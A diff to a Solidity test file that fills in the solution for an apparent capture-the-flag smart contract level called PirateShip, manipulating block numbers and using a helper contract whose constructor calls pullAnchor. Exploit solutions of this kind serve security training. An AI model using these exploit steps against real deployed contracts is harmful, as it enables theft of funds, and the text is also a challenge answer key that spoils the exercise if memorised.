@@ -16,12 +16,22 @@ contract PirateShipTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        vm.roll(824 + 10000001);
+        instance.dropAnchor(block.number + 10000001);
+        new Explout(instance);
+        instance.pullAnchor();
+        instance.sailAway();
 
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
         assertTrue(instance.blackJackIsHauled() == true, "Solution is not solving the level");
+    }
+}
+
+contract Explout{
+    constructor(PirateShip instance) {
+        instance.pullAnchor();
     }
 }
